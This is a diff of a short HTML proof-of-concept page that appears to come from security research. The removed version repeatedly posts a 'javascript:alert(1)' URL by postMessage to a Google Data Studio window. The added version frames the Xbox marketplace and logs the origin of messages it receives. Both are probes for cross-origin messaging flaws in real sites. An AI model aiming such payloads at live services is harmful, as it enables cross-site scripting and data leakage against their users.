@@ -1,13 +1,22 @@
-<!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html>
 <head>
-  <meta charset="utf-8">
-  <title></title>
-  <script>
-  var popup = window.open('https://datastudio.google.com/u/0/external?origin=https://datastudio.google.com/');
-  function post(){popup.postMessage({"type": "externalUrl", "url": "javascript:alert(1)"},"*")}
-  setInterval(post,1000);
-  </script>
+  <title>PoC</title>
+</head>
+
 <body>
+  <div id="message"></div>
+  <iframe id=x src="https://marketplace.xbox.com/en-US/" width="1000" height="1000"></iframe>
+  <script>
+      function listener(event) {
+        document.getElementById("message").innerHTML = event.origin;
+        alert(event.origin);
+        console.log(event)
+      }
+      if (window.addEventListener) {
+        addEventListener("message", listener, false);
+      } else {
+        attachEvent("onmessage", listener);
+      }
+  </script>
 </body>
 </html>
